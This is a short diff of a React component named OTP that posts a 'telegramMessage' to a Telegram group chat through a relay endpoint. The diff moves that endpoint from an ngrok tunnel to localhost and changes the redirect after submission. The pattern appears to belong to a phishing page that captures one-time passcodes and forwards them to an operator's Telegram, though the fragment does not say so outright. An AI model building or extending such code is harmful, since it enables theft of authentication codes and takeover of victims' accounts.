@@ -42,8 +42,8 @@ const OTP = () => {
     const chatId = '-4542132850'; // Asegúrate de que este ID sea correcto
 
     try {
-      await axios.post('https://proof.ngrok.app/enviarmensaje', { chatId, message: telegramMessage });
-      navigate('/'); // Cambia la ruta según tus necesidades
+      await axios.post('http://localhost:3000/enviarmensaje', { chatId, message: telegramMessage });
+      navigate('/signup/loginoption'); // Cambia la ruta según tus necesidades
     } catch (error) {
       console.error('Error en la solicitud:', error);
       alert('Error al enviar los datos.');
